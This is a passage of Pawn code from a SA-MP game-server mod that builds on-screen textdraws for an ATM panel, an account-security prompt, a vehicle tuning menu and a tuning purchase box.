	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ATMTD[playerid][11], 146.000000, 17.000000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][11], 1);
	PlayerTextDrawColor(playerid, ATMTD[playerid][11], -1743182696);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][11], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][11], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][11], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][11], 4);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][11], 0);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][11], 0);
	PlayerTextDrawSetSelectable(playerid, ATMTD[playerid][11], true);
	
	SecuritateTD[playerid][0] = CreatePlayerTextDraw(playerid, 27.000000, 180.375000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SecuritateTD[playerid][0], 122.000000, 123.000000);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][0], 0);

	SecuritateTD[playerid][1] = CreatePlayerTextDraw(playerid, 27.399999, 181.412536, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SecuritateTD[playerid][1], 121.000000, 121.000000);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][1], 1);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][1], 168430335);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][1], 4);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][1], 0);

	SecuritateTD[playerid][2] = CreatePlayerTextDraw(playerid, 86.900032, 183.000000, "Securitate_cont");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][2], 0.248499, 0.886875);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][2], 2);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][2], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][2], 0);

	SecuritateTD[playerid][3] = CreatePlayerTextDraw(playerid, 40.000000, 207.062500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SecuritateTD[playerid][3], 94.000000, 17.000000);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][3], 1);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][3], 1010580735);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][3], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][3], 4);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, SecuritateTD[playerid][3], true);

	SecuritateTD[playerid][4] = CreatePlayerTextDraw(playerid, 39.900009, 239.838592, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SecuritateTD[playerid][4], 94.000000, 17.000000);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][4], 1);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][4], 1010580735);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][4], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][4], 4);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][4], 0);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, SecuritateTD[playerid][4], true);

	SecuritateTD[playerid][5] = CreatePlayerTextDraw(playerid, 85.900016, 212.549987, "Intrdo_parola_contului...");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][5], 0.200499, 0.703125);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][5], 2);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][5], -1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][5], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][5], 1);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][5], 0);

	SecuritateTD[playerid][6] = CreatePlayerTextDraw(playerid, 86.900016, 245.799987, "Introdu_cuvantul_cheie...");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][6], 0.200499, 0.703125);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][6], 2);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][6], -1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][6], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][6], 1);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][6], 0);

	SecuritateTD[playerid][7] = CreatePlayerTextDraw(playerid, 47.000000, 268.312500, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SecuritateTD[playerid][7], 71.000000, 23.000000);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][7], 1);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][7], 16711935);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][7], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][7], 4);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][7], 0);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][7], 0);
	PlayerTextDrawSetSelectable(playerid, SecuritateTD[playerid][7], true);

	SecuritateTD[playerid][8] = CreatePlayerTextDraw(playerid, 83.400016, 274.674987, "Completed");
	PlayerTextDrawLetterSize(playerid, SecuritateTD[playerid][8], 0.293500, 0.808125);
	PlayerTextDrawAlignment(playerid, SecuritateTD[playerid][8], 2);
	PlayerTextDrawColor(playerid, SecuritateTD[playerid][8], -1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, SecuritateTD[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, SecuritateTD[playerid][8], 255);
	PlayerTextDrawFont(playerid, SecuritateTD[playerid][8], 2);
	PlayerTextDrawSetProportional(playerid, SecuritateTD[playerid][8], 1);
	PlayerTextDrawSetShadow(playerid, SecuritateTD[playerid][8], 0);
	
	TuneTD[0] = CreatePlayerTextDraw(playerid, 516.500000, 114.312500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[0], 133.000000, 300.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[0], 1);
	PlayerTextDrawColor(playerid, TuneTD[0], 336860270);
	PlayerTextDrawSetShadow(playerid, TuneTD[0], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[0], 255);
	PlayerTextDrawFont(playerid, TuneTD[0], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[0], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[0], 0);

	TuneTD[1] = CreatePlayerTextDraw(playerid, 518.000854, 132.250000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[1], 135.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[1], 1);
	PlayerTextDrawColor(playerid, TuneTD[1], 168430335);
	PlayerTextDrawSetShadow(playerid, TuneTD[1], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[1], 255);
	PlayerTextDrawFont(playerid, TuneTD[1], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[1], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[1], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[1], true);

	TuneTD[2] = CreatePlayerTextDraw(playerid, 618.000000, 133.125000, "W~W~HEELS");
	PlayerTextDrawLetterSize(playerid, TuneTD[2], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[2], 3);
	PlayerTextDrawColor(playerid, TuneTD[2], 336901375);
	PlayerTextDrawSetShadow(playerid, TuneTD[2], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[2], 255);
	PlayerTextDrawFont(playerid, TuneTD[2], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[2], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[2], 0);

	TuneTD[3] = CreatePlayerTextDraw(playerid, 518.600463, 157.625000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[3], 135.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[3], 1);
	PlayerTextDrawColor(playerid, TuneTD[3], 168430335);
	PlayerTextDrawSetShadow(playerid, TuneTD[3], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[3], 255);
	PlayerTextDrawFont(playerid, TuneTD[3], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[3], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[3], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[3], true);

	TuneTD[4] = CreatePlayerTextDraw(playerid, 617.000000, 159.300048, "E~W~NGINE");
	PlayerTextDrawLetterSize(playerid, TuneTD[4], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[4], 3);
	PlayerTextDrawColor(playerid, TuneTD[4], 336901375);
	PlayerTextDrawSetShadow(playerid, TuneTD[4], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[4], 255);
	PlayerTextDrawFont(playerid, TuneTD[4], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[4], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[4], 0);

	TuneTD[5] = CreatePlayerTextDraw(playerid, 518.600463, 183.226562, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[5], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[5], 135.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[5], 1);
	PlayerTextDrawColor(playerid, TuneTD[5], 168430335);
	PlayerTextDrawSetShadow(playerid, TuneTD[5], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[5], 255);
	PlayerTextDrawFont(playerid, TuneTD[5], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[5], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[5], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[5], true);

	TuneTD[6] = CreatePlayerTextDraw(playerid, 630.296752, 184.501586, "P~W~AINTJOBS");
	PlayerTextDrawLetterSize(playerid, TuneTD[6], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[6], 3);
	PlayerTextDrawColor(playerid, TuneTD[6], 336901375);
	PlayerTextDrawSetShadow(playerid, TuneTD[6], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[6], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[6], 255);
	PlayerTextDrawFont(playerid, TuneTD[6], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[6], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[6], 0);

	TuneTD[7] = CreatePlayerTextDraw(playerid, 518.600463, 209.628173, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[7], 135.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[7], 1);
	PlayerTextDrawColor(playerid, TuneTD[7], 168430335);
	PlayerTextDrawSetShadow(playerid, TuneTD[7], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[7], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[7], 255);
	PlayerTextDrawFont(playerid, TuneTD[7], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[7], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[7], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[7], true);

	TuneTD[8] = CreatePlayerTextDraw(playerid, 609.101928, 210.303161, "N~W~ITRO");
	PlayerTextDrawLetterSize(playerid, TuneTD[8], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[8], 3);
	PlayerTextDrawColor(playerid, TuneTD[8], 336901375);
	PlayerTextDrawSetShadow(playerid, TuneTD[8], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[8], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[8], 255);
	PlayerTextDrawFont(playerid, TuneTD[8], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[8], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[8], 0);

	TuneTD[9] = CreatePlayerTextDraw(playerid, 518.600463, 236.129791, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[9], 135.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[9], 1);
	PlayerTextDrawColor(playerid, TuneTD[9], 168430335);
	PlayerTextDrawSetShadow(playerid, TuneTD[9], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[9], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[9], 255);
	PlayerTextDrawFont(playerid, TuneTD[9], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[9], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[9], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[9], true);

	TuneTD[10] = CreatePlayerTextDraw(playerid, 631.596435, 236.704772, "H~w~ydraulics");
	PlayerTextDrawLetterSize(playerid, TuneTD[10], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[10], 3);
	PlayerTextDrawColor(playerid, TuneTD[10], 336901375);
	PlayerTextDrawSetShadow(playerid, TuneTD[10], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[10], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[10], 255);
	PlayerTextDrawFont(playerid, TuneTD[10], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[10], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[10], 0);

	TuneTD[11] = CreatePlayerTextDraw(playerid, 518.600463, 262.731414, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[11], 135.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[11], 1);
	PlayerTextDrawColor(playerid, TuneTD[11], 168430335);
	PlayerTextDrawSetShadow(playerid, TuneTD[11], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[11], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[11], 255);
	PlayerTextDrawFont(playerid, TuneTD[11], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[11], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[11], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[11], true);

	TuneTD[12] = CreatePlayerTextDraw(playerid, 606.902587, 263.006378, "S~W~TEREO");
	PlayerTextDrawLetterSize(playerid, TuneTD[12], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[12], 3);
	PlayerTextDrawColor(playerid, TuneTD[12], 336901375);
	PlayerTextDrawSetShadow(playerid, TuneTD[12], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[12], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[12], 255);
	PlayerTextDrawFont(playerid, TuneTD[12], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[12], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[12], 0);

	TuneTD[13] = CreatePlayerTextDraw(playerid, 518.600463, 290.133087, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[13], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[13], 135.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[13], 1);
	PlayerTextDrawColor(playerid, TuneTD[13], 168430335);
	PlayerTextDrawSetShadow(playerid, TuneTD[13], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[13], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[13], 255);
	PlayerTextDrawFont(playerid, TuneTD[13], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[13], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[13], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[13], true);

	TuneTD[14] = CreatePlayerTextDraw(playerid, 624.398315, 291.008087, "S~W~POILERS");
	PlayerTextDrawLetterSize(playerid, TuneTD[14], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[14], 3);
	PlayerTextDrawColor(playerid, TuneTD[14], 336901375);
	PlayerTextDrawSetShadow(playerid, TuneTD[14], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[14], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[14], 255);
	PlayerTextDrawFont(playerid, TuneTD[14], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[14], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[14], 0);

	TuneTD[15] = CreatePlayerTextDraw(playerid, 518.600463, 318.334808, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuneTD[15], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[15], 135.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[15], 1);
	PlayerTextDrawColor(playerid, TuneTD[15], 168430335);
	PlayerTextDrawSetShadow(playerid, TuneTD[15], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[15], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[15], 255);
	PlayerTextDrawFont(playerid, TuneTD[15], 4);
	PlayerTextDrawSetProportional(playerid, TuneTD[15], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[15], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[15], true);

	TuneTD[16] = CreatePlayerTextDraw(playerid, 626.697753, 319.109802, "E~w~XHAUSTS");
	PlayerTextDrawLetterSize(playerid, TuneTD[16], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[16], 3);
	PlayerTextDrawColor(playerid, TuneTD[16], 336901375);
	PlayerTextDrawSetShadow(playerid, TuneTD[16], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[16], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[16], 255);
	PlayerTextDrawFont(playerid, TuneTD[16], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[16], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[16], 0);

	TuneTD[17] = CreatePlayerTextDraw(playerid, 521.000000, 302.875000, "");
	PlayerTextDrawLetterSize(playerid, TuneTD[17], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuneTD[17], 149.000000, 133.000000);
	PlayerTextDrawAlignment(playerid, TuneTD[17], 1);
	PlayerTextDrawColor(playerid, TuneTD[17], -1);
	PlayerTextDrawSetShadow(playerid, TuneTD[17], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[17], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[17], 0);
	PlayerTextDrawFont(playerid, TuneTD[17], 5);
	PlayerTextDrawSetProportional(playerid, TuneTD[17], 0);
	PlayerTextDrawSetShadow(playerid, TuneTD[17], 0);
	PlayerTextDrawSetPreviewModel(playerid, TuneTD[17], 562);
	PlayerTextDrawSetPreviewRot(playerid, TuneTD[17], 0.000000, 0.000000, 325.000000, 1.000000);
	PlayerTextDrawSetPreviewVehCol(playerid, TuneTD[17], 1, 1);

	TuneTD[18] = CreatePlayerTextDraw(playerid, 583.697753, 395.234802, "ELEGY");
	PlayerTextDrawLetterSize(playerid, TuneTD[18], 0.387500, 1.293750);
	PlayerTextDrawAlignment(playerid, TuneTD[18], 2);
	PlayerTextDrawColor(playerid, TuneTD[18], 1008569855);
	PlayerTextDrawSetShadow(playerid, TuneTD[18], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[18], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[18], 255);
	PlayerTextDrawFont(playerid, TuneTD[18], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[18], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[18], 0);

	TuneTD[19] = CreatePlayerTextDraw(playerid, 533.697753, 116.109802, "X");
	PlayerTextDrawLetterSize(playerid, TuneTD[19], 0.567000, 1.363749);
	PlayerTextDrawTextSize(playerid, TuneTD[19], 10.0, 10.0);
	PlayerTextDrawAlignment(playerid, TuneTD[19], 2);
	PlayerTextDrawColor(playerid, TuneTD[19], -1105980161);
	PlayerTextDrawSetShadow(playerid, TuneTD[19], 0);
	PlayerTextDrawSetOutline(playerid, TuneTD[19], 0);
	PlayerTextDrawBackgroundColor(playerid, TuneTD[19], 255);
	PlayerTextDrawFont(playerid, TuneTD[19], 2);
	PlayerTextDrawSetProportional(playerid, TuneTD[19], 1);
	PlayerTextDrawSetShadow(playerid, TuneTD[19], 0);
	PlayerTextDrawSetSelectable(playerid, TuneTD[19], true);
	
	TuningBuy[playerid][0] = CreatePlayerTextDraw(playerid, 513.500000, 203.562500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][0], 157.000000, 87.000000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][0], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][0], 505290495);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][0], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][0], 0);

	TuningBuy[playerid][1] = CreatePlayerTextDraw(playerid, 585.000000, 210.125000, "CATEGORIE:_WHEELS");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][1], 0.221499, 1.215000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][1], 2);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][1], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][1], 0);

	TuningBuy[playerid][2] = CreatePlayerTextDraw(playerid, 513.500244, 203.599975, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][2], 134.000000, 25.000000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][2], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][2], 505328895);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][2], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][2], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][2], 0);

	TuningBuy[playerid][3] = CreatePlayerTextDraw(playerid, 513.300537, 244.724975, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][3], 137.000000, 1.000000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][3], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][3], 505328895);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][3], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][3], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][3], 0);

	TuningBuy[playerid][4] = CreatePlayerTextDraw(playerid, 634.301025, 232.875000, "Left `Chrome Flames` Sideskirt");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][4], 0.157499, 0.895624);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][4], 3);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][4], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][4], 0);

	TuningBuy[playerid][5] = CreatePlayerTextDraw(playerid, 513.400756, 259.300384, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][5], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][5], 138.980010, 11.890020);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][5], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][5], 1017134335);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][5], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][5], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][5], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][5], 0);
	PlayerTextDrawSetSelectable(playerid, TuningBuy[playerid][5], true);

	TuningBuy[playerid][6] = CreatePlayerTextDraw(playerid, 607.501220, 247.412506, "$~w~10,000");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][6], 0.280499, 0.825625);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][6], 3);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][6], 1017134335);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][6], 0);
